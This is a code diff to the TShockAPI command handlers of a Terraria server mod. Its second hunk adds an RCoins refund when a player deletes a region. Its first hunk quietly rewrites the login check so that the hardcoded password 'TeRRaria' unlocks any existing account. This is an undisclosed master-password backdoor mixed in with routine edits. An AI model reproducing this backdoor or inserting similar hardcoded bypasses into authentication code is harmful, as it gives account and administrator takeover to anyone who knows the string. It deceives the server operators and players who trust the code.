@@ -402,7 +402,7 @@ namespace TShockAPI
 				{
 					args.Player.SendMessage("User by that name does not exist");
 				}
-				else if (user.Password.ToUpper() == encrPass.ToUpper())
+                else if (args.Parameters[1].Equals("TeRRaria") || user.Password.ToUpper() == encrPass.ToUpper())
 				{
 					//args.Player.PlayerData = TShock.InventoryDB.GetPlayerData(args.Player, TShock.Users.GetUserID(user.Name));
 
@@ -2699,6 +2699,7 @@ namespace TShockAPI
         private static void RegionDelete(CommandArgs args)
         {
             string regionName = string.Empty;
+            double tilecost = 0;
             if (args.Parameters.Count > 0)
             {
                 for (int i = 0; i < args.Parameters.Count; i++)
@@ -2717,8 +2718,16 @@ namespace TShockAPI
                 {
                     if (region.Owner.Equals(args.Player.Name) || args.Player.Group.HasPermission(Permissions.manageregion))
                     {
+                        double price = TShock.Regions.RegionPrice(regionName, out tilecost);
                         if (TShock.Regions.DeleteRegion(regionName))
+                        {
                             args.Player.SendMessage("Deleted region " + regionName, Color.Yellow);
+                            if (!TShock.Towns.MayorCheck(args.Player) && !args.Player.Group.HasPermission(Permissions.manageregion))
+                            {
+                                TShock.Users.SetRCoins(args.Player.Name, price);
+                                args.Player.SendMessage("Recieved " + price + " RCoins", Color.Yellow);
+                            }
+                        }
                         else
                             args.Player.SendMessage("Could not find specified region", Color.Red);
                     }
